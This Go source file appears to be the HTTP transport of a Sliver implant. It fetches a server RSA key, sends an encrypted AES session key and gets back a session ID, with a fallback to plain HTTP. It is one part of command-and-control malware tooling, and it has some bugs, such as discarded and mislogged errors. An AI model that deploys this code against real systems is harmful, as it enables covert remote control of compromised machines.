package transports

// {{if .HTTPServer}}

import (
	"bytes"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"time"

	pb "sliver/protobuf/sliver"

	"github.com/golang/protobuf/proto"
)

const (
	defaultTimeout    = time.Second * 10
	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
)

func httpStartSession(address string) (*http.Client, error) {
	var client *http.Client
	var ID string
	var key *AESKey
	var err error

	client = httpsClient()
	secureOrigin := fmt.Sprintf("https://%s", address)
	ID, key, err = httpSessionInit(secureOrigin, client)
	if err != nil {
		client = httpClient() // Fallback to insecure HTTP
		insecureOrigin := fmt.Sprintf("http://%s", address)
		ID, key, err = httpSessionInit(insecureOrigin, client)
	}
	if err != nil {
		return nil, err
	}

	// {{if. Debug}}
	log.Printf("Started new HTTP session with id %s/%v", ID, key)
	// {{end}}

	return client, nil
}

func httpSessionInit(origin string, client *http.Client) (string, *AESKey, error) {

	publicKey := httpGetPublicKey(origin, client)
	if publicKey == nil {
		// {{if .Debug}}
		log.Printf("Invalid public key")
		// {{end}}
		return "", nil, errors.New("error")
	}
	sessionKey := RandomAESKey()
	httpSessionInit := &pb.HTTPSessionInit{
		Key: sessionKey[:],
	}
	data, _ := proto.Marshal(httpSessionInit)
	encryptedSessionInit, err := RSAEncrypt(data, publicKey)
	if err != nil {
		// {{if .Debug}}
		log.Printf("RSA encrypt failed %v", err)
		// {{end}}
		return "", nil, errors.New("error")
	}

	ID, err := httpGetSessionID(origin, client, sessionKey, encryptedSessionInit)

	return ID, &sessionKey, nil
}

func httpGetPublicKey(origin string, client *http.Client) *rsa.PublicKey {
	req, _ := http.NewRequest("GET", fmt.Sprintf("%s/rsakey", origin), nil)
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		// {{if. Debug}}
		log.Printf("Failed to fetch server public key")
		// {{end}}
		return nil
	}
	data, _ := ioutil.ReadAll(resp.Body)
	pubKeyBlock, _ := pem.Decode(data)
	if pubKeyBlock == nil {
		// {{if .Debug}}
		log.Printf("failed to parse certificate PEM")
		// {{end}}
		return nil
	}
	// {{if .Debug}}
	log.Printf("RSA Fingerprint: %s", fingerprintSHA256(pubKeyBlock))
	// {{end}}

	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
	if certErr == nil {
		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
		return cert.PublicKey.(*rsa.PublicKey)
	}

	// {{if .Debug}}
	log.Printf("Invalid certificate %v", err)
	// {{end}}
	return nil
}

func httpGetSessionID(origin string, client *http.Client, sessionKey AESKey, sessionInit []byte) (string, error) {
	reader := bytes.NewReader(sessionInit)
	req, _ := http.NewRequest("POST", fmt.Sprintf("%s/start", origin), reader)
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		// {{if. Debug}}
		log.Printf("Failed to fetch session id")
		// {{end}}
		return "", nil
	}
	data, _ := ioutil.ReadAll(resp.Body)
	sessionID, err := GCMDecrypt(sessionKey, data)
	if err != nil {
		// {{if. Debug}}
		log.Printf("Failed to decrypt session id")
		// {{end}}
		return "", err
	}
	return string(sessionID), nil
}

func httpClient() *http.Client {
	return &http.Client{
		Timeout: defaultReqTimeout,
	}
}

func httpsClient() *http.Client {
	var netTransport = &http.Transport{
		Dial: (&net.Dialer{
			Timeout: defaultTimeout,
		}).Dial,
		TLSHandshakeTimeout: defaultTimeout,
	}
	return &http.Client{
		Timeout:   defaultReqTimeout,
		Transport: netTransport,
	}
}

// {{end}} -HTTPServer
